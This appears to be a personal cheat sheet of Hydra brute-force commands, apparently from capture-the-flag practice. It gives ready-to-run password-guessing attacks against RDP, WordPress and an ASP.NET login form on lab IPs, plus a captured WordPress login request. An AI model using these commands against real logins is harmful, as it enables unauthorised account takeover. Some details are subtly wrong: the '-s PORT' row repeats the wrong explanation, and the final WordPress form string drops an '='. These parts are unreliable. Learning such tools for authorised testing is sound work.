# Hydra

| Option            | Explanation                                                   |
| ----------------- | ------------------------------------------------------------- |
| `-l username`     | Provide the login name                                        |
| `-P WordList.txt` | Specify the password list to use                              |
| `server service`  | Set the server address and service to attack                  |
| `-s PORT`         | Set the server address and service to attack                  |
| `-V` or `-vV`     | Show the username and password combinations being tried       |
| `-d`              | Display debugging output if the verbose output is not helping | 

| Command                                                                                                                                         | Description                                                                                                                                                        |
| ----------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `hydra -P <wordlist> -v <ip> <protocol>`                                                                                                        | Brute force against a protocol of your choice                                                                                                                      |
| `hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>`                                                                  | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| `hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`                                                                                       | Attack a Windows Remote Desktop with a password list.                                                                                                              |
| `hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' ` | Craft a more specific request for Hydra to brute force.                                                                                                            | 

Craft a more specific request for Hydra to brute force.

```shell
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.13.215 http-form-post "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=Q3C6t5UR5WbecqI6RxFVaHu2Jtr1TdsBm55dod6%2BSIHxT0kxMBXn8wPbUnML9Vy9uRcSdloliGhTiMXdg3L7dnVvby02BPayOuD6c2LVg%2FU1c1yfSmFi5O6NlaTJYr68DyAXNg6D0j2asLCrpbH%2FWtzIy%2BZc3SUPCjeyLjkOGGAvF%2BTu&__EVENTVALIDATION=v4fE3cbsejLdoruZ%2FnmnsQwMup0S0RVxnZgjAleWBCxzueQe6GQdUCeTG2i7uhPOvsZLXXydTOvEA2CVgd1vzxHIeYpzSSUxXjRSmXxYMBjDiqZ%2BE3y8DMbAC4KwudESlYVM2xBlpPHOe5utRfzqUDFKO5Df4kWeOvLVLRLBuTxZAlxu&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" 
```

WordPress - Burp
```php
POST /wp-login.php HTTP/1.1

Host: 10.10.114.27

log=§admin§&pwd=§admin§&wp-submit=§Log+In§&redirect_to=§https%3A%2F%2F10.10.114.27%2Fwp-admin%2F§&testcookie=§1§
```

WordPress - Hydra input
```shell
hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd^PASS^:Invalid username" -t 30

```

#tools #hydra